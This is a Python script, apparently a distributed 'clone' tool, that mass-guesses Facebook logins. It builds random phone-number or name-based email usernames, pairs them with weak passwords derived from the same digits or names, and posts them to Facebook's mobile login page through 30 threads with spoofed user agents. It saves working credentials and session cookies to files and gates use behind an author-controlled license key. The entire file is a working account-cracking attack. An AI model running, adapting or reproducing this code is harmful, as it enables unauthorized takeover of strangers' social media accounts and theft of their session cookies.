#Create By: EMON HOSSAN BABU 
#FaceBook: EMON HOSSAN MIAZI 
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen2=[]
ugen=[]
 
ugen=[ ]
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.2','6.0.1','5.1.1','5.0','5.0.1','7.0','10','11','12','13','14','15','16','17','18','19','20'])
    c='SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
    ugen.append(ug)
os.system('xdg-open https://www.facebook.com/120Xuspa')
logo = ("""
\033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗  \x1b[1;96m╔═╗\x1b[38;5;208m╔═╗\033[31;1m╔═╗\033[1;97m╔╗╔\033[1;30m╔╗╔   \033[33;1m╦ ╦\033[35;1m╦╔═╗\033[32;1m╔═╗\033[31;1m╔╗╔
\033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║  \x1b[1;96m╠═╣\x1b[38;5;208m╠╣ \033[31;1m╠═╣\033[1;97m║║║\033[1;30m║║║   \033[33;1m╠═╣\033[35;1m║╠═╝\033[32;1m╠═╣\033[31;1m║║║
\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩  \x1b[1;96m╩ ╩\x1b[38;5;208m╚  \033[31;1m╩ ╩\033[1;97m╝╚╝\033[1;30m╝╚╝   \033[33;1m╩ ╩\033[35;1m╩╩  \033[32;1m╩ ╩\033[31;1m╝╚╝

\x1b[1;95m  ███████╗███╗  ██╗ ██████╗ ███╗  ██╗    ██╗  ██╗ ██████╗ ███████╗ ███╗  ██╗
\x1b[1;94m  ██╔════╝████╗ ██║██╔════╝ ████╗ ██║    ██║  ██║██╔═══██╗██╔════╝ ████╗ ██║
\x1b[1;93m  █████╗  ██╔██╗██║██║  ██╗ ██╔██╗██║    ███████║██║   ██║█████╗   ██╔██╗██║
\x1b[1;92m  ██╔══╝  ██║╚████║██║  ╚██╗██║╚████║    ██╔══██║██║   ██║██╔══╝   ██║╚████║
\x1b[1;91m  ███████╗██║ ╚███║╚██████╔╝██║ ╚███║    ██║  ██║╚██████╔╝███████╗ ██║ ╚███║
\x1b[1;97m  ╚══════╝╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚══╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═╝  ╚══╝
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m \033[38;5;46m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mEMON HOSSAN MIAZI    \033[38;5;46 
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1memomhossan21        \033[38;5;46m │  \033[33;1
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01875828427       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34m𝙀𝙢𝙤𝙣 𝙃𝙤𝙨𝙨𝙖𝙣 𝙈𝙞𝙖𝙯𝙞         \033[38;5;46m│
\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")




import os
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')



try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="Emon-Miazi"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get("https://github.com/emomhossan21/CONTROL/blob/main/CONTROL.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print("""
\033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗ \x1b[1;96m╦ ╦\x1b[38;5;208m╔╦╗\033[31;1m╔╦╗\033[1;97m╦\033[1;30m╔╗╔\33[33;1m  ╦\33[35;1m╦\33[32;1m╔═╗\33[31;1m╔═╗\33[34;1m╔╗╔
\033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║ \x1b[1;96m║ ║ \x1b[38;5;208m║║ \033[31;1m║║\033[1;97m║\033[1;30m║║║ \33[33;1m ║\33[35;1m║\33[32;1m╚═╗\33[31;1m╠═╣\33[34;1m║║║
\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩ \x1b[1;96m╚═╝\x1b[38;5;208m═╩╝\033[31;1m═╩╝\033[1;97m╩\033[1;30m╝╚╝ \33[33;1m╚╝\33[35;1m╩\33[32;1m╚═╝\33[31;1m╩ ╩\33[34;1m╝╚╝
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m \033[38;5;46m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mEMON HOSSAN MIAZI    \033[38;5;46 
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1memomhossan21        \033[38;5;46m │  \033[33;1
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01875828427       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mEMON HOSSAN         \033[38;5;46m│
\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801875828427')
    exit()
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/120Xuspa')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in EMON-OK.txt,EMON-CP.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\x1b[1;96m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mEMON\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
			'method':'GET',
			'path':'/?tbua=1',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'referer': 'https://p.facebook.com/',
			'sec-ch-prefers-color-scheme': 'light',
			'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
			'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.76", "Not(A:Brand";v="8.0.0.0"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': '"10.0.0"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[EMON-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/EMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               ## print(f"\x1b[38;5;196m[EMON-CP] {cid}|{ps}")
                open('/sdcard/EMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[EMON] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()